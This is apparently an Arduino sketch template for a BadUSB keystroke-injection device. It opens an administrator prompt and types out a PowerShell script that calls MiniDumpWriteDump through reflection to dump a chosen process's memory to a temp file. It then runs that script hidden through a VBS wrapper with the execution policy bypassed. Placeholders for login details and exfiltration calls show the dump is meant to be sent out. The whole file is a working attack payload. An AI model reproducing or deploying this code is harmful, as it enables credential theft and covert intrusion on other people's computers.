void setup(){
  Keyboard.begin();
}
void loop(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  Memory dump\" > %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting') >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $WERNM = $WER.GetNestedType('NativeMethods', 'NonPublic') >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $Flags = [Reflection.BindingFlags] 'NonPublic, Static' >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $MDW = $WERNM.GetMethod('MiniDumpWriteDump', $Flags) >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $MDF = [UInt32] 2 >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $PrI = Get-Process \"INPUT4\" >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $PrN = $PrI.ProcessName >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $PrH = $PrI.Handle >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $FSt = New-Object IO.FileStream(\"$env:temp\\$PrN.dmp\", [IO.FileMode]::Create) >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $Result = $MDW.Invoke($null, @($PrH,$ProcessId,$FSt.SafeFileHandle,$MDF,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)) >> %temp%\\mdmp.ps1"));
  Keyboard.println(F("echo $FSt.Close() >> %temp%\\mdmp.ps1"));
  delay(2000);

  String fn = "mdmp";
  String fp = "$env:temp\\$PrN.dmp";
  EXFILCALLS

  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\mdmp.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\mdmp.ps1\"),0,true >> %temp%\\mdmp.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\mdmp.vbs"));
  delay(3000);

  Keyboard.println(F("exit"));
  while(true);
}


DEFS
EXFILDEFS
